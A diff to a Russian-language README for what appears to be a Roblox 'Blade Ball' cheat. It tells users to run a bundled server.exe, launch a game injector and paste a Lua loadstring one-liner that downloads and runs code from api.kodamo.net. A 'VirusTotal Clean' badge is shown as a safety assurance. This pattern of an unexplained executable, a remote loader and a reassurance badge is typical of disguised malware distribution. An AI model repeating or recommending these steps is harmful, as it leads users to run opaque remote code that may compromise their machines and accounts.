@@ -7,14 +7,14 @@
 1. Скачайте и запустите исполняемый файл `server.exe` (находится в репозитории выше).
 2. Запустите любой совместимый инжектор (тестировалось на **Xeno** и **Madium**).
 3. Скопируйте и выполните в инжекторе:
+```lua
+loadstring(game:HttpGet("[https://api.kodamo.net/loader/1u4taz87hy4tpn2dkei5](https://api.kodamo.net/loader/1u4taz87hy4tpn2dkei5)"))()
+```
 
 ## ─── Проверка безопасности ───
 
 [![VirusTotal Check](https://img.shields.io/badge/VirusTotal-Clean-brightgreen?style=for-the-badge&logo=virustotal)](https://www.virustotal.com/gui/url/d46a7f5bb82c30c68ea22829cb61df7c3e129794199789b8d2dafbdc8e477abd?nocache=1)
 
-```lua
-loadstring(game:HttpGet("[https://api.kodamo.net/loader/1u4taz87hy4tpn2dkei5](https://api.kodamo.net/loader/1u4taz87hy4tpn2dkei5)"))()
-```
 ## ─── Архитектура и назначение сервера ───
 
 В актуальных версиях Blade Ball блокируется (`VirtualInput` и `VirtualInputManager`). 
